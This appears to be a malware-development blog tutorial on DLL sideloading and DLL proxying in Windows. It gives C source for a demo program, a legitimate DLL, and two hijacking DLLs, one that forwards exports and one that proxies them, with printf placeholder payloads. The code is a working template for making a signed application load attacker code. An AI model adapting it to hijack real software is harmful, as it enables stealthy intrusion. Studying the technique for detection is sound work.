# https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Sideloading + Proxying in Custom Software</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>Sideloading involves exporting the functions that the .exe is utilizing from the DLL we are hijacking. This way, we can prevent the software from crashing. One advantage of DLL Sideloading is that we use a legitimate and signed application to execute our malicious payload, significantly increasing our chances of success. Another approach to further enhance our hijacking is to apply DLL Proxying, where we create a bridge to the original DLL function, ensuring that the application encounters no issues when using the specific functionality that relies on this exported function.</p><p>SafeDllSearchMode is the order set by Windows to search for a DLL during the loading process by the Windows DLL Loader. We can leverage this order for our activities. Now, let’s see what SafeDllSearchMode looks like.</p><p></p><p>We cannot hijack DLLs that are in the Known DLLs folder, but from that point onward, there is an opportunity. If we have privileges in the directory where the executable is being run, we can carry out the hijacking.</p><h1 id="proof-of-concept--poc-">Proof of concept ( POC )</h1><p>In this first step, we’ll provide a practical introduction to how DLL Sideloading + Proxying works within a software designed specifically for illustrative purposes. Below, I’ll outline the project’s structure.</p><h2 id="project-structure"><span class="me-2">Project Structure</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#project-structure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>.
├── Bin
│   ├── Custom_Software.exe
│   ├── Dll_Legit1.dll
│   └── Dll_Legit.dll
├── Makefile
└── Sources
    ├── Custom_Software.c
    ├── Dll_Legit.c
    ├── Dll_Mal_Foward.c
    ├── Dll_Mal_Foward.def
    └── Dll_Mal_NoFoward.c
</pre></td></tr></tbody></table></code></div></div><p>The project is organized with each program in C compiling into a separate, distinct file.</p><ul><li>Custom_Software: This software is responsible for loading the DLL and executing its function.</li><li>Dll_Legit: This file is responsible for generating the legitimate DLL that will be loaded by the Custom_Software.</li><li>Dll_Mal_Foward: This file is responsible for generating the DLL that will perform the sideloading + proxying and execute the payload using Foward.</li><li>Dll_Mal_NoFoward: This file is responsible for generating the DLL that will perform the sideloading + proxying and execute the payload dont using Foward.</li><li>Dll_Mal_Foward.def: This file is responsible for define Foward functions.</li></ul><h2 id="custom-software"><span class="me-2">Custom Software</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#custom-software" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="nf">PCHAR</span><span class="p">(</span><span class="o">*</span><span class="n">fnRetStr</span><span class="p">)();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">HMODULE</span>  <span class="n">hLegitDll</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Dll_Legit.dll"</span><span class="p">);</span>
    <span class="n">fnRetStr</span> <span class="n">pRetStr</span>   <span class="o">=</span> <span class="p">(</span><span class="n">fnRetStr</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span> <span class="n">hLegitDll</span><span class="p">,</span> <span class="s">"RetStr"</span> <span class="p">);</span> 
    <span class="n">PCHAR</span>    <span class="n">Str</span>       <span class="o">=</span> <span class="n">pRetStr</span><span class="p">();</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="dll_legit"><span class="me-2">Dll_Legit</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#dll_legit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DLLEXPORT extern __declspec(dllexport)
</span>
<span class="n">DLLEXPORT</span> <span class="n">PCHAR</span> <span class="nf">RetStr</span><span class="p">(){</span>
    <span class="n">PCHAR</span>  <span class="n">LegitStr</span> <span class="o">=</span> <span class="s">"[I] Run Legit Print :D</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">LegitStr</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[I] Attach Legit DLL</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><p>Dll_Legit only performs prints, one when the Dll is Attached to a process and another when the exported function is used by our Custom Software.</p><hr><h2 id="dll_mal_nofoward"><span class="me-2">Dll_Mal_NoFoward</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#dll_mal_nofoward" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="cm">/*---------------------------[ Payload ]---------------------------*/</span>

<span class="kt">void</span> <span class="nf">ProcAtt</span><span class="p">(){</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[I] DLL Sideloading in PROCESS ATTACH &gt;:)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">InFuncExp</span><span class="p">(){</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[I] DLL Sideloading in Exported Function &gt;:)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	
<span class="p">}</span>

<span class="cm">/*---------------------------[ DLL Proxying ]---------------------------*/</span>

<span class="cp">#define DLLEXPORT extern __declspec(dllexport)
</span>
<span class="k">typedef</span> <span class="nf">PCHAR</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">fnRetStr</span><span class="p">)();</span>

<span class="n">DLLEXPORT</span> <span class="n">PVOID</span> <span class="nf">RetStr</span><span class="p">(){</span>
    
    <span class="n">InFuncExp</span><span class="p">();</span>

    <span class="n">HMODULE</span>  <span class="n">hDll</span>    <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Dll_Legit1.dll"</span><span class="p">);</span>
    <span class="n">fnRetStr</span> <span class="n">pRetStr</span> <span class="o">=</span> <span class="p">(</span><span class="n">fnRetStr</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span> <span class="n">hDll</span><span class="p">,</span> <span class="s">"RetStr"</span> <span class="p">);</span>

    <span class="k">return</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">pRetStr</span><span class="p">();</span>
<span class="p">}</span>

<span class="cm">/*---------------------------[ DllMain ]---------------------------*/</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="n">ProcAtt</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="dll_mal_foward"><span class="me-2">Dll_Mal_Foward</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#dll_mal_foward" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="cm">/*---------------------------[ Payload ]---------------------------*/</span>

<span class="kt">void</span> <span class="nf">ProcAtt</span><span class="p">(){</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[I] DLL Sideloading in PROCESS ATTACH &gt;:)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="p">}</span>


<span class="cm">/*---------------------------[ DllMain ]---------------------------*/</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="n">ProcAtt</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="two-ways-to-proxying">Two ways to Proxying</h1><p>There are two ways to perform proxying: Forwarding or NoForwarding.</p><h2 id="foward"><span class="me-2">Foward</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#foward" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>One of the two ways to perform Proxying is through Dll_Mal_Foward, which utilizes the Dll_Mal_Foward.def file in compilation for function forwarding. Below is the content of the Dll_Mal_Foward.def file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>LIBRARY "Dll_Legit"
EXPORTS
    RetStr=Dll_Legit1.RetStr @1
</pre></td></tr></tbody></table></code></div></div><p>When we proxy using forwarding, the difference is that it will only be possible to execute the payload through DllMain. In this case, I’m using DLL_PROCESS_ATTACH, and statically as follows:</p><p></p><p>Now, when we execute the Custom_Software, the following result will be displayed:</p><p></p><h2 id="nofoward"><span class="me-2">NoFoward</span><a href="https://oblivion-malware.xyz/posts/sideloading-proxying-custom-software/#nofoward" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We have two ways to load the payload: adding it inside the function that will be proxied and within DLL_PROCESS_ATTACH. Both methods have been implemented in this version. The proxying is straightforward: the exported function will load and return the address of the legitimate function, allowing it to be executed normally. Statically, as follows:</p><p></p><p>Now, when we execute the Custom_Software, the following result will be displayed:</p><p></p><h1 id="observation">Observation</h1><p>It’s also possible to perform sideloading through DLL path hijacking. Imagine we have the original DLL, Dll_Legit.dll, located at C:\Windows\System32\Dll_Legit.dll. We can upload our DLL to the same path as Dll_Legit and specify the absolute path in our malicious implementation. The prerequisite for this would be to check in Process Monitor if it generates a NAME NOT FOUND result with the following filter shown below:</p><p></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Sideloading%20+%20Proxying%20in%20Custom%20Software%20-%20Oblivion&amp;url=%2Fposts%2Fsideloading-proxying-custom-software%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Sideloading%20+%20Proxying%20in%20Custom%20Software%20-%20Oblivion&amp;u=%2Fposts%2Fsideloading-proxying-custom-software%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fsideloading-proxying-custom-software%2F&amp;text=Sideloading%20+%20Proxying%20in%20Custom%20Software%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>